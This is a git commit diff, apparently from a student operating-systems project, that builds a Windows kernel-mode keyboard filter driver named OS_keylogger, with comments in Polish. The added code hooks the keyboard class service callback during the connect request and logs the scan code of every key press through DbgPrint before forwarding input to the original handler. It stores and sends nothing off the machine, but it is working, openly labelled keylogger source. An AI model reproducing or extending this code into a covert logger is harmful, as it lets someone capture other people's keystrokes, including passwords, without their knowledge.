9e1dfd79d080b5f1750e25d2084170c355623150
Nikodem Czachorowski <czachorowski123@gmail.com>
2025-12-31 19:27:02 +0100

    works in dobugger

--- OS_keylogger/Driver.c
+++ OS_keylogger/Driver.c
@@ -2,10 +2,28 @@
 #include <wdf.h>
 
 #include<ntddkbd.h>
+#include <kbdmou.h>
+
+typedef struct _DEVICE_CONTEXT {
+    CONNECT_DATA UpperConnectData; 
+    BOOLEAN IsHooked;
+} DEVICE_CONTEXT, * PDEVICE_CONTEXT;
+
+WDF_DECLARE_CONTEXT_TYPE(DEVICE_CONTEXT)
+
+PDEVICE_CONTEXT global_context;
 
 DRIVER_INITIALIZE DriverEntry;
 EVT_WDF_DRIVER_DEVICE_ADD OS_keyloggerEvtDeviceAdd;
-EVT_WDF_IO_QUEUE_IO_READ OS_keyloggerRead;
+//EVT_WDF_IO_QUEUE_IO_READ OS_keyloggerRead;
+EVT_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL OS_keyloggerInternalDeviceControl;
+VOID
+OS_keyloggerCallback(
+    _In_    PDEVICE_OBJECT       DeviceObject,
+    _In_    PKEYBOARD_INPUT_DATA InputDataStart,
+    _In_    PKEYBOARD_INPUT_DATA InputDataEnd,
+    _Inout_ PULONG               InputDataConsumed
+);
 
 NTSTATUS
 DriverEntry(
@@ -19,11 +37,13 @@ DriverEntry(
     // Allocate the driver configuration object
     WDF_DRIVER_CONFIG config;
 
+    //DbgBreakPoint();
+
     // Print "Hello World" for DriverEntry
     DbgPrint("OS_keylogger: DriverEntry\n");
 
     // Initialize the driver configuration object to register the
-    // entry point for the EvtDeviceAdd callback, KmdfHelloWorldEvtDeviceAdd
+    // entry point for the EvtDeviceAdd callback
     WDF_DRIVER_CONFIG_INIT(&config,
         OS_keyloggerEvtDeviceAdd
     );
@@ -59,6 +79,7 @@ OS_keyloggerEvtDeviceAdd(
 
     WdfDeviceInitSetDeviceType(DeviceInit, FILE_DEVICE_KEYBOARD);
 
+    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&wdfObjectAttr, DEVICE_CONTEXT);
     // Create the device object
     status = WdfDeviceCreate(&DeviceInit,
         &wdfObjectAttr,
@@ -66,16 +87,19 @@ OS_keyloggerEvtDeviceAdd(
     );
 
     if (!NT_SUCCESS(status)) {
-        DbgPrint("OS_keylogger: WdfDeviceCreate failed\n");
+        DbgPrint("OS_keylogger: WdfDeviceCreate failed with status 0x%x\n", status);
         return status;
     }
+
+    global_context = WdfObjectGet_DEVICE_CONTEXT(wdfDevice);
 
     WDF_IO_QUEUE_CONFIG queueConfig;
 
     WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&queueConfig,
         WdfIoQueueDispatchParallel);
 
-    queueConfig.EvtIoRead = OS_keyloggerRead;
+    //queueConfig.EvtIoRead = OS_keyloggerRead;
+    queueConfig.EvtIoInternalDeviceControl = OS_keyloggerInternalDeviceControl;
 
     status = WdfIoQueueCreate(wdfDevice,
         &queueConfig,
@@ -84,13 +108,130 @@ OS_keyloggerEvtDeviceAdd(
     );
 
     if (!NT_SUCCESS(status)) {
-        DbgPrint("OS_keylogger: WdfIoQueueCreate failed\n");
+        DbgPrint("OS_keylogger: WdfIoQueueCreate failed with status 0x%x\n", status);
         return status;
     }
 
     return STATUS_SUCCESS;
 }
 
+VOID
+OS_keyloggerInternalDeviceControl(
+    WDFQUEUE    Queue,
+    WDFREQUEST  Request,
+    size_t      OutputBufferLength,
+    size_t      InputBufferLength,
+    ULONG       IoControlCode
+)
+{
+    UNREFERENCED_PARAMETER(OutputBufferLength);
+
+    DbgPrint("OS_keylogger: InternalDeviceControl\n");
+
+    NTSTATUS status;
+    PCONNECT_DATA connectData;
+    size_t length;
+
+    WDFDEVICE device;
+    PDEVICE_CONTEXT context;
+
+    WDF_REQUEST_SEND_OPTIONS options;
+    WDFIOTARGET target;
+    BOOLEAN ret;
+
+    //odczytujemy device i kontekst 
+    device = WdfIoQueueGetDevice(Queue);
+    context = WdfObjectGet_DEVICE_CONTEXT(device);
+
+    //jeœli nie po³¹czenie klawiatury to pomijamy
+    if (IoControlCode != IOCTL_INTERNAL_KEYBOARD_CONNECT)
+    {
+        goto Forward;
+    }
+
+    //sprawdzamy, czy bufor ma poprawny rozmiar
+    if (InputBufferLength < sizeof(CONNECT_DATA))
+    {
+        DbgPrint("OS_keylogger: Z³y rozmiar bufora!\n");
+        WdfRequestComplete(Request, STATUS_INVALID_PARAMETER);
+        return;
+    }
+
+    status = WdfRequestRetrieveInputBuffer(Request, sizeof(CONNECT_DATA), (PVOID*)&connectData, &length);
+    if (!NT_SUCCESS(status))
+    {
+        WdfRequestComplete(Request, status);
+        return;
+    }
+
+    context->UpperConnectData = *connectData;
+    connectData->ClassService = (PVOID)OS_keyloggerCallback;
+    connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(device);
+
+    DbgPrint("OS_keylogger: Hook installed\n");
+
+Forward:
+
+    WdfRequestFormatRequestUsingCurrentType(Request);
+
+    target = WdfDeviceGetIoTarget(device);
+
+    WDF_REQUEST_SEND_OPTIONS_INIT(&options, WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);
+
+    ret = WdfRequestSend(Request, target, &options);
+
+    if (ret == FALSE)   
+    {
+        status = WdfRequestGetStatus(Request);
+        DbgPrint("OS_keylogger: WdfRequestSend failed: 0x%x\n", status);
+        WdfRequestComplete(Request, status);
+    }
+}
+
+VOID
+OS_keyloggerCallback(
+    _In_    PDEVICE_OBJECT       DeviceObject,
+    _In_    PKEYBOARD_INPUT_DATA InputDataStart,
+    _In_    PKEYBOARD_INPUT_DATA InputDataEnd,
+    _Inout_ PULONG               InputDataConsumed
+)
+{ 
+    UNREFERENCED_PARAMETER(DeviceObject);
+
+    PDEVICE_CONTEXT context = global_context;
+
+    if (!context)
+        return;
+
+    PKEYBOARD_INPUT_DATA currentPacket;
+
+    for (currentPacket = InputDataStart; currentPacket < InputDataEnd; currentPacket++) {
+        BOOLEAN isKeyRelease = (currentPacket->Flags & KEY_BREAK) ? TRUE : FALSE;
+
+        if (!isKeyRelease)
+        {
+            // Logujemy tylko wciœniêcia (Key Down)
+            DbgPrint("OS_keylogger: Klawisz WCISNIETY! ScanCode: 0x%02X | Flags: 0x%X\n",
+                currentPacket->MakeCode,
+                currentPacket->Flags);
+        }
+    }
+
+    //Wywo³anie nastêpnej funkcji
+    PSERVICE_CALLBACK_ROUTINE upperService = (PSERVICE_CALLBACK_ROUTINE)context->UpperConnectData.ClassService;
+
+    if (upperService)
+    {
+        upperService(
+            context->UpperConnectData.ClassDeviceObject,
+            InputDataStart,
+            InputDataEnd,
+            InputDataConsumed
+            );
+    }
+}
+
+/*
 VOID
 OS_keyloggerRead(
     _In_ WDFQUEUE queue,
@@ -114,3 +255,4 @@ OS_keyloggerRead(
     }
     WdfRequestComplete(request, STATUS_SUCCESS);
 }
+*/
